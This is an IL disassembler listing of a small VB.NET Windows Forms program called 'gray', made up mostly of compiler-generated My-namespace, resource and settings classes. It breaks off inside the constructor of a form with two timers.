
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.8.3928.0
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v4.0.30319
.module extern user32
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly extern Microsoft.VisualBasic
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 10:0:0:0
}
.assembly extern System.Windows.Forms
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly extern System.IO.Compression.FileSystem
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly extern System.Drawing
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 4:0:0:0
}
.assembly gray
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.

  // --- The following custom attribute is added automatically, do not uncomment -------
  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 02 00 00 00 00 00 ) 

  .custom instance void [mscorlib]System.Reflection.AssemblyTitleAttribute::.ctor(string) = ( 01 00 04 67 72 61 79 00 00 )                      // ...gray..
  .custom instance void [mscorlib]System.Reflection.AssemblyDescriptionAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyCompanyAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyProductAttribute::.ctor(string) = ( 01 00 04 67 72 61 79 00 00 )                      // ...gray..
  .custom instance void [mscorlib]System.Reflection.AssemblyCopyrightAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyTrademarkAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.GuidAttribute::.ctor(string) = ( 01 00 24 33 31 37 63 39 33 66 64 2D 37 36 34 34   // ..$317c93fd-7644
                                                                                                  2D 34 39 30 61 2D 39 37 35 36 2D 62 66 66 31 35   // -490a-9756-bff15
                                                                                                  37 61 35 65 32 61 64 00 00 )                      // 7a5e2ad..
  .custom instance void [mscorlib]System.Reflection.AssemblyFileVersionAttribute::.ctor(string) = ( 01 00 07 31 2E 30 2E 30 2E 30 00 00 )             // ...1.0.0.0..
  .custom instance void [mscorlib]System.Runtime.Versioning.TargetFrameworkAttribute::.ctor(string) = ( 01 00 1C 2E 4E 45 54 46 72 61 6D 65 77 6F 72 6B   // ....NETFramework
                                                                                                        2C 56 65 72 73 69 6F 6E 3D 76 34 2E 37 2E 32 01   // ,Version=v4.7.2.
                                                                                                        00 54 0E 14 46 72 61 6D 65 77 6F 72 6B 44 69 73   // .T..FrameworkDis
                                                                                                        70 6C 61 79 4E 61 6D 65 14 2E 4E 45 54 20 46 72   // playName..NET Fr
                                                                                                        61 6D 65 77 6F 72 6B 20 34 2E 37 2E 32 )          // amework 4.7.2
  .hash algorithm 0x00008004
  .ver 1:0:0:0
}
.mresource public gray.Form1.resources
{
  // Offset: 0x00000000 Length: 0x000000B4
  // WARNING: managed resource file gray.Form1.resources created
}
.mresource public gray.Resources.resources
{
  // Offset: 0x000000B8 Length: 0x000000B4
  // WARNING: managed resource file gray.Resources.resources created
}
.module gray.exe
// MVID: {4EFD7892-A00D-47BE-8E10-F6DA284784F5}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0002       // WINDOWS_GUI
.corflags 0x00020003    //  ILONLY 32BITPREFERRED
// Image base: 0x06360000


// =============== CLASS MEMBERS DECLARATION ===================

.class private auto ansi gray.My.MyApplication
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ConsoleApplicationBase
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ConsoleApplicationBase::.ctor()
    IL_0006:  ret
  } // end of method MyApplication::.ctor

} // end of class gray.My.MyApplication

.class private auto ansi gray.My.MyComputer
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0006:  ret
  } // end of method MyComputer::.ctor

} // end of class gray.My.MyComputer

.class private auto ansi sealed beforefieldinit gray.My.MyProject
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .class auto ansi sealed nested assembly MyWebServices
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyGroupCollectionAttribute::.ctor(string,
                                                                                                         string,
                                                                                                         string,
                                                                                                         string) = ( 01 00 34 53 79 73 74 65 6D 2E 57 65 62 2E 53 65   // ..4System.Web.Se
                                                                                                                     72 76 69 63 65 73 2E 50 72 6F 74 6F 63 6F 6C 73   // rvices.Protocols
                                                                                                                     2E 53 6F 61 70 48 74 74 70 43 6C 69 65 6E 74 50   // .SoapHttpClientP
                                                                                                                     72 6F 74 6F 63 6F 6C 12 43 72 65 61 74 65 5F 5F   // rotocol.Create__
                                                                                                                     49 6E 73 74 61 6E 63 65 5F 5F 13 44 69 73 70 6F   // Instance__.Dispo
                                                                                                                     73 65 5F 5F 49 6E 73 74 61 6E 63 65 5F 5F 00 00   // se__Instance__..
                                                                                                                     00 ) 
    .method public hidebysig strict virtual 
            instance bool  Equals(object o) cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       13 (0xd)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  ldarg.1
      IL_0002:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0007:  call       instance bool [mscorlib]System.Object::Equals(object)
      IL_000c:  ret
    } // end of method MyWebServices::Equals

    .method public hidebysig strict virtual 
            instance int32  GetHashCode() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance int32 [mscorlib]System.Object::GetHashCode()
      IL_0006:  ret
    } // end of method MyWebServices::GetHashCode

    .method assembly hidebysig instance class [mscorlib]System.Type 
            GetType() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       11 (0xb)
      .maxstack  8
      IL_0000:  ldtoken    gray.My.MyProject/MyWebServices
      IL_0005:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_000a:  ret
    } // end of method MyWebServices::GetType

    .method public hidebysig strict virtual 
            instance string  ToString() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance string [mscorlib]System.Object::ToString()
      IL_0006:  ret
    } // end of method MyWebServices::ToString

    .method private static !!T  Create__Instance__<.ctor T>(!!T 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       20 (0x14)
      .maxstack  1
      .locals init (!!T V_0)
      IL_0000:  ldarg.0
      IL_0001:  box        !!T
      IL_0006:  brtrue.s   IL_0010

      IL_0008:  call       !!0 [mscorlib]System.Activator::CreateInstance<!!0>()
      IL_000d:  stloc.0
      IL_000e:  br.s       IL_0012

      IL_0010:  ldarg.0
      IL_0011:  stloc.0
      IL_0012:  ldloc.0
      IL_0013:  ret
    } // end of method MyWebServices::Create__Instance__

    .method private instance void  Dispose__Instance__<T>(!!T& 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       8 (0x8)
      .maxstack  8
      IL_0000:  ldarg.1
      IL_0001:  initobj    !!T
      IL_0007:  ret
    } // end of method MyWebServices::Dispose__Instance__

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method MyWebServices::.ctor

  } // end of class MyWebServices

  .class auto ansi sealed nested assembly ThreadSafeObjectProvider`1<.ctor T>
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
    .field private static !T m_ThreadStaticValue
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.ThreadStaticAttribute::.ctor() = ( 01 00 00 00 ) 
    .method assembly specialname instance !T 
            get_GetInstance() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       28 (0x1c)
      .maxstack  8
      IL_0000:  ldsfld     !0 class gray.My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0005:  box        !T
      IL_000a:  brtrue.s   IL_0016

      IL_000c:  call       !!0 [mscorlib]System.Activator::CreateInstance<!T>()
      IL_0011:  stsfld     !0 class gray.My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0016:  ldsfld     !0 class gray.My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_001b:  ret
    } // end of method ThreadSafeObjectProvider`1::get_GetInstance

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method ThreadSafeObjectProvider`1::.ctor

    .property instance !T GetInstance()
    {
      .get instance !T gray.My.MyProject/ThreadSafeObjectProvider`1::get_GetInstance()
    } // end of property ThreadSafeObjectProvider`1::GetInstance
  } // end of class ThreadSafeObjectProvider`1

  .field private static initonly class gray.My.MyProject/ThreadSafeObjectProvider`1<class gray.My.MyComputer> m_ComputerObjectProvider
  .field private static initonly class gray.My.MyProject/ThreadSafeObjectProvider`1<class gray.My.MyApplication> m_AppObjectProvider
  .field private static initonly class gray.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> m_UserObjectProvider
  .field private static initonly class gray.My.MyProject/ThreadSafeObjectProvider`1<class gray.My.MyProject/MyWebServices> m_MyWebServicesObjectProvider
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       41 (0x29)
    .maxstack  8
    IL_0000:  newobj     instance void class gray.My.MyProject/ThreadSafeObjectProvider`1<class gray.My.MyComputer>::.ctor()
    IL_0005:  stsfld     class gray.My.MyProject/ThreadSafeObjectProvider`1<class gray.My.MyComputer> gray.My.MyProject::m_ComputerObjectProvider
    IL_000a:  newobj     instance void class gray.My.MyProject/ThreadSafeObjectProvider`1<class gray.My.MyApplication>::.ctor()
    IL_000f:  stsfld     class gray.My.MyProject/ThreadSafeObjectProvider`1<class gray.My.MyApplication> gray.My.MyProject::m_AppObjectProvider
    IL_0014:  newobj     instance void class gray.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::.ctor()
    IL_0019:  stsfld     class gray.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> gray.My.MyProject::m_UserObjectProvider
    IL_001e:  newobj     instance void class gray.My.MyProject/ThreadSafeObjectProvider`1<class gray.My.MyProject/MyWebServices>::.ctor()
    IL_0023:  stsfld     class gray.My.MyProject/ThreadSafeObjectProvider`1<class gray.My.MyProject/MyWebServices> gray.My.MyProject::m_MyWebServicesObjectProvider
    IL_0028:  ret
  } // end of method MyProject::.cctor

  .method assembly specialname static class gray.My.MyComputer 
          get_Computer() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class gray.My.MyProject/ThreadSafeObjectProvider`1<class gray.My.MyComputer> gray.My.MyProject::m_ComputerObjectProvider
    IL_0005:  callvirt   instance !0 class gray.My.MyProject/ThreadSafeObjectProvider`1<class gray.My.MyComputer>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Computer

  .method assembly specialname static class gray.My.MyApplication 
          get_Application() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class gray.My.MyProject/ThreadSafeObjectProvider`1<class gray.My.MyApplication> gray.My.MyProject::m_AppObjectProvider
    IL_0005:  callvirt   instance !0 class gray.My.MyProject/ThreadSafeObjectProvider`1<class gray.My.MyApplication>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Application

  .method assembly specialname static class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User 
          get_User() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class gray.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> gray.My.MyProject::m_UserObjectProvider
    IL_0005:  callvirt   instance !0 class gray.My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_User

  .method assembly specialname static class gray.My.MyProject/MyWebServices 
          get_WebServices() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class gray.My.MyProject/ThreadSafeObjectProvider`1<class gray.My.MyProject/MyWebServices> gray.My.MyProject::m_MyWebServicesObjectProvider
    IL_0005:  callvirt   instance !0 class gray.My.MyProject/ThreadSafeObjectProvider`1<class gray.My.MyProject/MyWebServices>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_WebServices

  .property class gray.My.MyComputer Computer()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 43 6F 6D 70 75 74 65 72 00 00 ) // ...My.Computer..
    .get class gray.My.MyComputer gray.My.MyProject::get_Computer()
  } // end of property MyProject::Computer
  .property class gray.My.MyApplication Application()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 41 70 70 6C 69 63 61 74 69 6F   // ...My.Applicatio
                                                                                                       6E 00 00 )                                        // n..
    .get class gray.My.MyApplication gray.My.MyProject::get_Application()
  } // end of property MyProject::Application
  .property class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User
          User()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 07 4D 79 2E 55 73 65 72 00 00 )             // ...My.User..
    .get class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User gray.My.MyProject::get_User()
  } // end of property MyProject::User
  .property class gray.My.MyProject/MyWebServices
          WebServices()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 57 65 62 53 65 72 76 69 63 65   // ...My.WebService
                                                                                                       73 00 00 )                                        // s..
    .get class gray.My.MyProject/MyWebServices gray.My.MyProject::get_WebServices()
  } // end of property MyProject::WebServices
} // end of class gray.My.MyProject

.class private auto ansi sealed gray.My.Resources.Resources
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 33 53 79 73 74 65 6D 2E 52 65 73 6F 75 72   // ..3System.Resour
                                                                                                  63 65 73 2E 54 6F 6F 6C 73 2E 53 74 72 6F 6E 67   // ces.Tools.Strong
                                                                                                  6C 79 54 79 70 65 64 52 65 73 6F 75 72 63 65 42   // lyTypedResourceB
                                                                                                  75 69 6C 64 65 72 08 31 36 2E 30 2E 30 2E 30 00   // uilder.16.0.0.0.
                                                                                                  00 ) 
  .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private static class [mscorlib]System.Resources.ResourceManager resourceMan
  .field private static class [mscorlib]System.Globalization.CultureInfo resourceCulture
  .method assembly specialname static class [mscorlib]System.Resources.ResourceManager 
          get_ResourceManager() cil managed
  {
    // Code size       49 (0x31)
    .maxstack  8
    IL_0000:  ldsfld     class [mscorlib]System.Resources.ResourceManager gray.My.Resources.Resources::resourceMan
    IL_0005:  ldnull
    IL_0006:  call       bool [mscorlib]System.Object::ReferenceEquals(object,
                                                                       object)
    IL_000b:  brfalse.s  IL_002b

    IL_000d:  ldstr      "gray.Resources"
    IL_0012:  ldtoken    gray.My.Resources.Resources
    IL_0017:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_001c:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Type::get_Assembly()
    IL_0021:  newobj     instance void [mscorlib]System.Resources.ResourceManager::.ctor(string,
                                                                                         class [mscorlib]System.Reflection.Assembly)
    IL_0026:  stsfld     class [mscorlib]System.Resources.ResourceManager gray.My.Resources.Resources::resourceMan
    IL_002b:  ldsfld     class [mscorlib]System.Resources.ResourceManager gray.My.Resources.Resources::resourceMan
    IL_0030:  ret
  } // end of method Resources::get_ResourceManager

  .method assembly specialname static class [mscorlib]System.Globalization.CultureInfo 
          get_Culture() cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  ldsfld     class [mscorlib]System.Globalization.CultureInfo gray.My.Resources.Resources::resourceCulture
    IL_0005:  ret
  } // end of method Resources::get_Culture

  .method assembly specialname static void 
          set_Culture(class [mscorlib]System.Globalization.CultureInfo Value) cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  stsfld     class [mscorlib]System.Globalization.CultureInfo gray.My.Resources.Resources::resourceCulture
    IL_0006:  ret
  } // end of method Resources::set_Culture

  .property class [mscorlib]System.Resources.ResourceManager
          ResourceManager()
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 02 00 00 00 00 00 ) 
    .get class [mscorlib]System.Resources.ResourceManager gray.My.Resources.Resources::get_ResourceManager()
  } // end of property Resources::ResourceManager
  .property class [mscorlib]System.Globalization.CultureInfo
          Culture()
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 02 00 00 00 00 00 ) 
    .get class [mscorlib]System.Globalization.CultureInfo gray.My.Resources.Resources::get_Culture()
    .set void gray.My.Resources.Resources::set_Culture(class [mscorlib]System.Globalization.CultureInfo)
  } // end of property Resources::Culture
} // end of class gray.My.Resources.Resources

.class private auto ansi sealed beforefieldinit gray.My.MySettings
       extends [System]System.Configuration.ApplicationSettingsBase
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 4B 4D 69 63 72 6F 73 6F 66 74 2E 56 69 73   // ..KMicrosoft.Vis
                                                                                                  75 61 6C 53 74 75 64 69 6F 2E 45 64 69 74 6F 72   // ualStudio.Editor
                                                                                                  73 2E 53 65 74 74 69 6E 67 73 44 65 73 69 67 6E   // s.SettingsDesign
                                                                                                  65 72 2E 53 65 74 74 69 6E 67 73 53 69 6E 67 6C   // er.SettingsSingl
                                                                                                  65 46 69 6C 65 47 65 6E 65 72 61 74 6F 72 08 31   // eFileGenerator.1
                                                                                                  36 2E 33 2E 30 2E 30 00 00 )                      // 6.3.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 02 00 00 00 00 00 ) 
  .field private static class gray.My.MySettings defaultInstance
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       21 (0x15)
    .maxstack  8
    IL_0000:  newobj     instance void gray.My.MySettings::.ctor()
    IL_0005:  call       class [System]System.Configuration.SettingsBase [System]System.Configuration.SettingsBase::Synchronized(class [System]System.Configuration.SettingsBase)
    IL_000a:  castclass  gray.My.MySettings
    IL_000f:  stsfld     class gray.My.MySettings gray.My.MySettings::defaultInstance
    IL_0014:  ret
  } // end of method MySettings::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System]System.Configuration.ApplicationSettingsBase::.ctor()
    IL_0006:  ret
  } // end of method MySettings::.ctor

  .method public specialname static class gray.My.MySettings 
          get_Default() cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  ldsfld     class gray.My.MySettings gray.My.MySettings::defaultInstance
    IL_0005:  ret
  } // end of method MySettings::get_Default

  .property class gray.My.MySettings Default()
  {
    .get class gray.My.MySettings gray.My.MySettings::get_Default()
  } // end of property MySettings::Default
} // end of class gray.My.MySettings

.class private auto ansi sealed gray.My.MySettingsProperty
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .method assembly specialname static class gray.My.MySettings 
          get_Settings() cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  call       class gray.My.MySettings gray.My.MySettings::get_Default()
    IL_0005:  ret
  } // end of method MySettingsProperty::get_Settings

  .property class gray.My.MySettings Settings()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 53 65 74 74 69 6E 67 73 00 00 ) // ...My.Settings..
    .get class gray.My.MySettings gray.My.MySettingsProperty::get_Settings()
  } // end of property MySettingsProperty::Settings
} // end of class gray.My.MySettingsProperty

.class public auto ansi gray.Form1
       extends [System.Windows.Forms]System.Windows.Forms.Form
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.DesignerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private object i
  .field private initonly int32 k
  .field private class [System]System.ComponentModel.IContainer components
  .field private class [System.Windows.Forms]System.Windows.Forms.Timer _Timer1
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.AccessedThroughPropertyAttribute::.ctor(string) = ( 01 00 06 54 69 6D 65 72 31 00 00 )                // ...Timer1..
  .field private class [System.Windows.Forms]System.Windows.Forms.Timer _Timer2
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.AccessedThroughPropertyAttribute::.ctor(string) = ( 01 00 06 54 69 6D 65 72 32 00 00 )                // ...Timer2..
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       41 (0x29)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldc.i4.0
    IL_0008:  box        [mscorlib]System.Int32
    IL_000d:  stfld      object gray.Form1::i
    IL_0012:  ldarg.0
    IL_0013:  ldstr      "10"
    IL_0018:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
